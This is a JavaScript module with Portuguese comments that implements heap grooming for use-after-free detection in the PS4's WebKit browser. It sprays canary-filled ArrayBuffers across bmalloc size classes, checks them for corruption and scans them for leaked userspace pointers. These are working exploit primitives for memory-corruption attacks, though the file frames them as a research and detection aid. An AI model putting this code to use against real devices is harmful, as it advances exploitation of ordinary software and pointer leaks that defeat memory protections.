/**
 * MOD_MUTATOR.JS — Heap Groomer para detecção de UAF
 *
 * Em vez de "payloads" genéricos, este módulo implementa o heap grooming:
 * a técnica de controlar o layout do heap para que o slot de memória do
 * objeto freed seja ocupado pelos nossos buffers de canário.
 *
 * Fluxo de uso no ciclo UAF:
 *   1. groomAll(CANARY_A) → ocupa memória ao redor do objeto alvo
 *   2. [trigger free do objeto]
 *   3. Libera os slots de A → cria "buracos" no heap
 *   4. groomAll(CANARY_B) → tenta ocupar o slot recém-liberado
 *   5. checkCorruption(slots, CANARY_B) → detecta se algo escreveu no slot
 *   6. scanForPointers(slots) → tenta capturar ponteiros do objeto freed
 *
 * Size classes correspondem às classes do bmalloc/IsoHeap do WebKit:
 *   32, 64, 128, 256, 512, 1024 bytes
 */

export const Mutator = {

    CANARY_A: 0x41, // 'A' — spray antes do free
    CANARY_B: 0x42, // 'B' — spray depois do free

    // Classes de tamanho do IsoHeap/bmalloc do WebKit no PS4
    SIZE_CLASSES: [32, 64, 128, 256, 512, 1024],

    /**
     * Aloca `count` ArrayBuffers de `size` bytes, todos preenchidos com `canary`.
     * @returns {ArrayBuffer[]} Slots — mantenha a referência para evitar coleta precoce.
     */
    spray: function(size, count, canary) {
        let slots = new Array(count);
        for (let i = 0; i < count; i++) {
            let buf = new ArrayBuffer(size);
            new Uint8Array(buf).fill(canary);
            slots[i] = buf;
        }
        return slots;
    },

    /**
     * Groom em todas as size classes simultaneamente.
     * Maximiza a probabilidade de que o slot do objeto freed
     * coincida com pelo menos um dos nossos buffers.
     */
    groomAll: function(canary, countPerClass = 64) {
        let slots = [];
        for (let sz of this.SIZE_CLASSES) {
            let chunk = this.spray(sz, countPerClass, canary);
            slots.push(...chunk);
        }
        return slots;
    },

    /**
     * Verifica se algum slot foi corrompido.
     * Uma corrupção significa que algo escreveu sobre o nosso canário
     * → indica Write-After-Free: o objeto freed escreveu na memória reutilizada.
     *
     * @returns {{ corrupted: boolean, offset?: number, expected?: number, found?: number, hex?: string }}
     */
    checkCorruption: function(slots, expectedCanary) {
        for (let buf of slots) {
            try {
                let view = new Uint8Array(buf);
                // Verifica apenas os primeiros 32 bytes (cabeçalho do objeto)
                for (let i = 0; i < Math.min(view.length, 32); i++) {
                    if (view[i] !== expectedCanary) {
                        return {
                            corrupted: true,
                            offset: i,
                            slotSize: buf.byteLength,
                            expected: expectedCanary,
                            found: view[i],
                            hex: `0x${view[i].toString(16).padStart(2, '0')}`
                        };
                    }
                }
            } catch(e) { /* slot pode ter sido detachado */ }
        }
        return { corrupted: false };
    },

    /**
     * Varre slots em busca de valores que pareçam ponteiros do PS4 userspace.
     * PS4 (FreeBSD/AMD64): ponteiros de userspace ficam tipicamente em
     * 0x0000_1000_0000_0000 – 0x0000_7FFF_FFFF_FFFF
     *
     * @returns {{ offset: number, val: bigint, hex: string }[]}
     */
    scanForPointers: function(slots) {
        const found = [];
        const LO = 0x0000100000000000n;
        const HI = 0x0000800000000000n;

        for (let buf of slots) {
            if (buf.byteLength < 8) continue;
            try {
                let view = new DataView(buf);
                for (let off = 0; off + 8 <= buf.byteLength; off += 8) {
                    let val = view.getBigUint64(off, true); // little-endian (x86)
                    if (val > LO && val < HI) {
                        found.push({
                            offset: off,
                            slotSize: buf.byteLength,
                            val,
                            hex: '0x' + val.toString(16).padStart(16, '0')
                        });
                    }
                }
            } catch(e) {}
        }
        return found;
    }
};
